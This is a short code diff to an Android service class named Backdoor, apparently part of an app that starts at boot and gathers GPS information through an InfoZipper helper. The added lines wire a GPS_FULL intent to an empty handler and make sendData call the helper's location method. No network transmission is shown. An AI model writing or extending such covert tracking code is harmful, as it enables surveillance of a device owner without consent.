@@ -6,6 +6,7 @@ import android.content.Intent;
 import android.net.wifi.WifiManager;
 import android.os.IBinder;
 public class Backdoor extends Service {
+    final static String GPS_FULL="GPS_FULL";
     public Backdoor() {
     }
     InfoZipper infoZipper=new InfoZipper();
@@ -35,6 +36,9 @@ public class Backdoor extends Service {
             case Intent.ACTION_BOOT_COMPLETED:
                 onPhoneStart();
                 break;
+            case GPS_FULL:
+                onGpsFull();
+                break;
         }
     }
 
@@ -48,6 +52,10 @@ public class Backdoor extends Service {
         sendData();
     }
     void sendData(){
+        infoZipper.toString();
+        infoZipper.gpsInfo();
+    }
+    void onGpsFull(){
 
     }
 }
